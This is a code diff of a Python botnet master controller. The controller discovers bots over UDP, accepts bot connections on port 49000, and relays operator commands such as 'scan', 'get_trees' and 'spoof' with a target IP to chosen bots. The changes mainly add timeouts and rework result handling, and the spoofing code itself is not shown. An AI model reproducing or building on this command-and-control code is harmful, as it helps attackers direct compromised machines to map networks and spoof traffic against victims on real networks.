@@ -27,19 +27,12 @@ def handle_command(data):
     if data == "scan":
         parent_conn.send(data)
         clients = parent_conn.recv()
-        # print("IP" + " " * 15 + "MAC")
-        # if clients:
-        #     for client in clients:
-        #         print("{}   {}".format(client['ip'], client['mac']))
-        # else:
-        #     print("scan failed")
         choice = "scan_result"
         return clients
 
     elif data.find("scan:") != -1:
         parent_conn.send(data)
         mac = parent_conn.recv()
-        # print(mac)
         choice = "scan_result:"
         clients.append({'ip': data.split(":")[1], 'mac': mac})
         return mac
@@ -136,12 +129,12 @@ def search_bots():
             master_socket.sendto("####".encode(), (bot, 48000))
 
 
+# listens for connections
 def listener():
     tcp_listener = socket.socket()
     tcp_listener.bind(("0.0.0.0", 49000))
     tcp_listener.listen()
 
-    # waiting for command (later receives from bot master)
     while True:
         (client_socket, client_address) = tcp_listener.accept()
         print(client_address)
@@ -149,11 +142,20 @@ def listener():
         con_th.start()
 
 
+# handles the messages that the master receives
 def con_thread_master(sock, addr):
+    global last_result, results
     while True:
-        result = sock.recv(1024).decode()
-        if result not in results:
-            results.append(result)
+        try:
+            result = sock.recv(1024).decode()
+            # if the master receives a message that is not the same as the instruction or the last answer
+            if result != results and result != msg and result != last_result:
+                results = result
+                last_result = result
+        except Exception as ex:
+            print(ex)
+            sock.close()
+            return
 
 
 if __name__ == '__main__':
@@ -165,8 +167,10 @@ if __name__ == '__main__':
 
     ips = ip_list()
     lan_tree = []
-    results = []
+    # results is the message to print
+    results = ""
     connections = []
+    last_result = ""
 
     send_thread = threading.Thread(target=send_to_network)
     recv_thread = threading.Thread(target=recv_replies)
@@ -198,7 +202,7 @@ if __name__ == '__main__':
     listener_thread = threading.Thread(target=listener)
     listener_thread.start()
 
-    # waiting for command (later receives from bot master)
+    # handles the master commands
     while True:
         if choice == "":
             choice = input("ins")
@@ -229,15 +233,18 @@ if __name__ == '__main__':
                     try:
                         if not connection:
                             tcp_socket.connect((botip, 49000))
-                        msg = "get_tree-" + botip
+                        msg = "get_trees-" + botip
+                        results = ""
                         tcp_socket.send(msg.encode())
-                        while True:
+                        start = time.time()
+                        while time.time() - start < 20:
                             if results:
-                                print(results.pop())
-                                results = []
+                                print(results)
                                 break
+                        results = ""
                         connection = botip
                     except Exception as e:
+                        tcp_socket = socket.socket()
                         connection = ""
                         print(str(e))
             elif master_command == "show_entire_network":
@@ -252,19 +259,20 @@ if __name__ == '__main__':
                         command = input("enter command")
                         if command.find("scan") != -1:
                             msg = command + "-" + botip
+                            print(msg)
+                            results = ""
                             tcp_socket.send(msg.encode())
-                            while True:
+                            start = time.time()
+                            while time.time() - start < 20:
                                 if results:
-                                    print(results.pop())
-                                    results = []
+                                    print(results)
                                     break
+                            results = ""
                         if command.find("spoof") != -1:
                             msg = command + "-" + botip + "-" + ip
                             tcp_socket.send(msg.encode())
                     except Exception as e:
+                        tcp_socket = socket.socket()
                         connection = ""
                         print(str(e))
                 pass
-            # elif master_command == "show_scan":
-            #     pass
-
